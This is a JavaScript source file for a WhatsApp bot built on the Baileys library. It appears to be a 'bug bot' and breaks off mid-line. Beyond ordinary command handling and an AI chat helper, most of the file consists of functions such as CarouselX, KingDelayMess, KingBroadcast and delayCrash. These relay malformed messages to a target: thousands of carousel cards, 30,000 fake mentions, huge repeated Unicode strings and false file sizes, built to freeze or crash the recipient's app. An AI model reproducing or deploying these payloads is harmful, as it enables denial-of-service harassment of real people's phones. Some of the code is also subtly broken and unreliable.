require('./system/config');
const { 
default: baileys, 
proto, 
getContentType, 
generateWAMessage, 
generateWAMessageFromContent, 
generateWAMessageContent,
prepareWAMessageMedia, 
downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const { default: makeWaSocket } = require('@whiskeysockets/baileys');
const fs = require('fs');
const mime = require('mime-types');
const NodeCache = require('node-cache');
const util = require('util')
const chalk = require('chalk')
const axios = require('axios')
const pino = require('pino')
const { performance } = require('perf_hooks');
const { writeFile, unlink } = require('fs/promises');
const { Sticker, createSticker, StickerTypes } = require("wa-sticker-formatter");
const JavaScriptObfuscator = require('javascript-obfuscator');
const path = require('path');
const sharp = require('sharp');
const ffmpeg = require('fluent-ffmpeg');
const cheerio = require('cheerio');
const { promisify } = require('util');
const gis = promisify(require('g-i-s'));
const { getBuffer, getGroupAdmins, getSizeMedia, formatSize, checkBandwidth, formatp, fetchJson, reSize, sleep, isUrl, runtime } = require('./system/myLib/FuncIndex');
module.exports = async function zynHandler(ask, m, msg, store) { 
 try{
 
   const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
//================FIN===================\\\
//DEV ASK TECH BASE ENC
//==============DATABASE================//
   global.spamDB = {};
const premium = JSON.parse(fs.readFileSync("./system/database/premium.json"))
const owner2 = JSON.parse(fs.readFileSync("./system/database/owner.json"))
const isPremium = premium.includes(m.sender)
//================FIN===================\\\
// DEV ASK TECH BASE ENC 
//===============CONFIGURASI============//
const autoreactConfig = JSON.parse(fs.readFileSync('./system/database/autoreact.json'));
if (autoreactConfig.status) {
    const randomEmoji = autoreactConfig.emojis[Math.floor(Math.random() * autoreactConfig.emojis.length)];
    await ask.sendMessage(m.chat, { react: { text: randomEmoji, key: m.key } });
}
const sender = m.key.fromMe ? ask.user.id.split(":")[0] + "@s.whatsapp.net" || ask.user.id : m.key.participant || m.key.remoteJid;
const budy = (typeof m.text === 'string' ? m.text : '');
const prefix = ".";
if (!body.startsWith(prefix)) return;  
const isCreator = owner2.includes(m.sender) ? true : m.sender == owner+"@s.whatsapp.net" ? true : m.fromMe ? true : false
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
var crypto = require("crypto")
const moment = require('moment-timezone');
const time = moment().format("HH:mm:ss DD/MM");
let { randomBytes } = require("crypto")
const makeid = randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = args.join(" ")
const botNumber = await ask.decodeJid(ask.user.id)
const isGroup = m.chat.endsWith('@g.us')
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushname || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await ask.groupMetadata(m.chat) : {}
let participant_bot = isGroup ? groupMetadata.participants.find((v) => v.id == botNumber) : {}
const groupName = isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participants?.admin !== null ? true : false
const { saveConversation, getDeveloper } = require('./database');

async function askAI(question, userId) {
    try {
        // Vérifier les questions spéciales
        if (question.toLowerCase().includes("qui est ton développeur") || 
            question.toLowerCase().includes("c'est qui ton dev")) {
            const dev = getDeveloper();
            return `Mon développeur est ${dev} - Créateur de technologies innovantes !`;
        }

        // API GPT-4
        const gptResponse = await axios.post('https://stablediffusion.fr/gpt4/predict2', {
            prompt: question,
            max_length: 150
        }, {
            headers: { 'Content-Type': 'application/json' }
        });

        // API ChatGPT-4
        const chatResponse = await axios.post('https://stablediffusion.fr/chatgpt4', {
            message: question,
            context: "Réponds de manière concise et technique"
        });

        // Fusionner les réponses
        let finalAnswer = `${gptResponse.data.result}\n\n${chatResponse.data.response}`.substring(0, 2000);

        // Sauvegarder la conversation
        saveConversation(userId, question, finalAnswer);

        return finalAnswer;

    } catch (error) {
        console.error('Erreur askAI:', error);
        return "Désolé, je rencontre des difficultés techniques. Veuillez réessayer plus tard.";
    }
}
async function CarouselX(target) {
for (let i = 0; i < 1020; i++) {
try {
        let push = [];

        // Generate 1000 cards
        for (let i = 0; i < 1020; i++) {
     
            push.push({
                body: proto.Message.InteractiveMessage.Body.fromObject({ text: "ㅤ" }),
                footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "ㅤㅤ" }),
                header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: '*ask9Core Was Here!*',
                    hasMediaAttachment: true,
                    imageMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
                        mimetype: "image/jpeg",
                        caption: "? ???????-?",
                        fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
                        fileLength: "10840",
                        height: 10,
                        width: 10,
                        mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                        fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                        directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1721344123",
                        jpegThumbnail: null,
                        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                        scanLengths: [2437, 17332],
                        contextInfo: {
                            mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                            isSampled: true,
                            participant: target,
                            remoteJid: "status@broadcast",
                            forwardingScore: 9741,
                            isForwarded: true
                        }
                    }
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
            });
        }
        
        const carousel = generateWAMessageFromContent(
            targetJID, 
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.create({ text: `${"𑜦".repeat(40000)}wkwkwkwkwkkwkwkwkwk2kwkwkwkkqkwkkwkwkwwkkwk\n\u0000` }),
                            footer: proto.Message.InteractiveMessage.Footer.create({ text: "`YT:` https://youtube.com/@askMods" }),
                            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: push })
                        })
                    }
                }
            }, 
            {}
        );

        await ask.relayMessage(targetJID, carousel.message, {
            participant: { jid: targetJID },
        });

    } catch (err) {
        console.error("Error in Fkod:", err);
    }
}
}

async function KingDelayMess(target, Ptcp = true) {
  await ask.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveMessage: proto.Message.InteractiveMessage.create({
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: Buffer.from("QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=", "base64"),
              fileLength: 9999999999999,
              pageCount: 1316134911,
              mediaKey: Buffer.from("45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=", "base64"),
              fileName: "kingbadboi.𝐜𝐨𝐦",
              fileEncSha256: Buffer.from("LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=", "base64"),
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: 1726867151,
              contactVcard: true
            },
            hasMediaAttachment: true
          },
          body: {
            text: "⏤⃟͟ask꙳𝘽𝙐𝙂͞͞⃟⏤͟͟͞͞͠🩸\n" + "@15056662003".repeat(1000)
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "Iqbhalkeifer",
                  url: "https://youtube.com/@iqbhalkeifer25",
                  merchant_url: "https://youtube.com/@iqbhalkeifer25"
                })
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "{}"
              }
            ],
            messageParamsJson: "{}"
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from({ length: 50 }, () => `${Math.floor(Math.random() * 9000000000) + 1000000000}@s.whatsapp.net`)
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: Buffer.from("QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=", "base64"),
                fileLength: 9999999999999,
                pageCount: 1316134911,
                mediaKey: Buffer.from("lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=", "base64"),
                fileName: "⏤⃟͟ask꙳𝘽𝙐𝙂͞͞⃟⏤͟͟͞͞͠🩸",
                fileEncSha256: Buffer.from("wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=", "base64"),
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: 1724474503,
                contactVcard: true
              }
            }
          }
        })
      }
    }
  }, Ptcp ? { participant: target } : {});
}
     
async function KingBroadcast(target, mention = true) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "⏤⃟͟ask꙳𝘽𝙐𝙂͞͞⃟⏤͟͟͞͞͠🩸",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "ask is him"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await ask.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await ask.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "⏤⃟͟ask꙳𝘽𝙐𝙂͞͞⃟⏤͟͟͞͞͠🩸" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
     
async function DelayInvisNew(target) {
  const payload = {
    key: {
      remoteJid: target,
      fromMe: false,
      id: "Qw"
    },
    message: {
      extendedTextMessage: {
        text: "\u2060", 
        matchedText: "\u2060",
        canonicalUrl: "https://t.me/Dimzxzzx",
        title: "Delay Bos",
        description: "⏤🤡⃟͟ask꙳𝘽𝙐𝙂͞͞⃟⏤͟͟͞͞͠",
        jpegThumbnail: "https://files.catbox.moe/exhryx.jpg",
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
            mediaType: 1,
            previewType: "DOCUMENT",
            title: "⏤🤡⃟͟ask꙳𝘽𝙐𝙂͞͞⃟⏤͟͟͞͞",
            thumbnailUrl: "https://files.catbox.moe/exhryx.jpg",
            sourceUrl: "https://t.me/Dimzxzzx"
          },
          forwardingScore: 999,
          isForwarded: true,
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "Dimzxzzx",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: 1726867151,
              contactVcard: true,
              jpegThumbnail: "https://files.catbox.moe/exhryx.jpg"
            }
          }
        }
      }
    }
  };

  await ask.relayMessage(target, payload.message, { messageId: payload.key.id });
}

async function superdelayinvid(target) {
  return {
    key: {
      remoteJid: target,
      fromMe: false,
      id: "BAE538D8B0529FB7",
    },
    message: {
      extendedTextMessage: {
        text: "⏤🤡⃟͟ask꙳𝘽𝙐𝙂͞͞⃟⏤͟͟͞͞",
        contextInfo: {
          participant: "13135550002@s.whatsapp.net",
          quotedMessage: {
            extendedTextMessage: {
              text: "⏤🤡⃟͟ask꙳𝘽𝙐𝙂͞͞⃟⏤͟͟͞͞",
            },
          },
          remoteJid: "status@broadcast"
        },
      },
    },
    messageTimestamp: Math.floor(Date.now() / 1000),
    broadcast: true,
    pushName:  "2709",
  };
}
async function delayCrash(target, mention = false, delayMs = 500) {
    for (const target of target) {
        const generateMessage = {
            viewOnceMessage: {
                message: {
                    imageMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                        mimetype: "image/jpeg",
                        caption: "? ???????-?",
                        fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                        fileLength: "19769",
                        height: 354,
                        width: 783,
                        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                        fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                        directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                        mediaKeyTimestamp: "1743225419",
                        jpegThumbnail: null,
                        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                        scanLengths: [2437, 17332],
                        contextInfo: {
                            mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Mat